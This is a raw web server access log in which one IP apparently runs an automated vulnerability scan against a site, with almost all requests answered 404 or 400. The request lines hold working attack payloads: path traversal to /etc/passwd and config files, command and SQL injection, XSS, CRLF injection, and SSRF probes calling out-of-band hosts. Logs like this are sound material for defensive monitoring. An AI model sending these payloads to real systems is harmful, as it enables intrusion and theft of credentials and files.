179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /defaultroot/officeserverservlet HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_jphone&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /autodiscover/autodiscover.json?Protocol=ActiveSync&Email=rRyAJs%40oast.pro&RedirectCount=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.5.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /gallery/zp-core/setup/index.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /html.bz2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /web-access.txt.x HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id; HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.8.22" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /php/backup/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /nagiosql/admin/commandline.php?cname=%27%20union%20select%20concat(md5(2078017302))%23 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /elmah HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.3" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /_cluster/settings HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/marcusolsson-hexmap-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?redirect=http%3A%2F%2Fwww.interact.sh HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /sfiler/Login.action HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /etc/designs/xh1x.childrenlist.json//%3Csvg%20onload=alert%28document.domain%29%3E.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; CrOS x86_64 14816.131.5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /titan-framework/lib/iframe-font-preview.php?font-type=google&font-family=%27/onerror=%27alert(document.domain)%27/b=%27 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /xwiki/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /sap/hana/xs/formLogin/login.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /status?full=true HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?f=\x5C[ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.2.27" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://d11vrvvlqhfdrjvik8kgjdu15x4nd8ks4.oast.fun HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /%5cgoogle.com/evil.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.5) AppleWebKit/617.19 (KHTML, like Gecko) Version/17.6.47 Safari/617.19" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/michaeldmoore-annunciator-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/loki/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /I6d8%3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.2.19" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cgi-bin/live_api.cgi?page=EUg&id=5&ip=;id; HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php/install HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; rv:128.0 ) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20interact.sh%0d%0aX-XSS-Protection:0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/neocat-cal-heatmap-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/uploads/data.txt HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /jeecg-boot/sys/user/querySysUser?username=admin HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /_next/../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/natel-plotly-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /hybridity/ui/hcx-client/index.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /xmlrpc.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /portal/info.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /controlplane HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /app/etc/local.xml.additional HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.9.17" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.20.13 (KHTML, like Gecko) Version/17.7.74 Safari/616.20.13" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /mailsms/s?func=ADMIN:appState&dumpConfig=/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.6.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?wp_nlm=confirmation&appurl=aHR0cDovL2ludGVyYWN0LnNo HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) LoiLoNote/15.0.0 Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /.gitignore HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /getCorsFile?urlPath=file:///c://windows/win.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - cxsdk [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/logs/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/michaeldmoore-multistat-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/meteostat-meteostat-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /authentication HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /status HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /login?redirectTo=/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script> HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /teamserver/faces/login.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /position.js HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /.npm/anonymous-cli-metrics.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /android/app/google-services.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /dompdf/dompdf/www/setup.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /_.htaccess HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=')AND+1+IN+(SELECT+sys.fn_varbintohexstr(hashbytes('MD5'%2C'999999999')))--+ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.6.27" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /calendar/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.7.21" "-"
159.89.211.52 - j2deployer [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.63" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Tokai/21.1.294403 Version/17.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /Business/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /hue/assets/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2fpasswd HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /Gruntfile.coffee HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/marcusolsson-treemap-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /backUP/root_access.txt.x HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /xwiki/bin/view/AppWithinMinutes/DeleteApplication?appName=Menu&resolve=true&xredirect=javascript:alert(document.domain) HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_12) AppleWebKit/618.17.9 (KHTML, like Gecko) Version/17.4 Safari/618.17.9" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_joomlaupdater&controller=../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /html/usr/share/doc/hostname/copyright%3f HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.7.21" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cgi-bin/wwwctrl.cgi?action=home HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /pre/config.php?version=2.0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /rest/v1/AccountService/Accounts HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /backup/config.xml HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /https://oast.me/oast.me HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - tomcat [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /ui_base/js/..%2f..%2f..%2f..%2fsettings.js HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1> HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/arforms/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 404 14 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
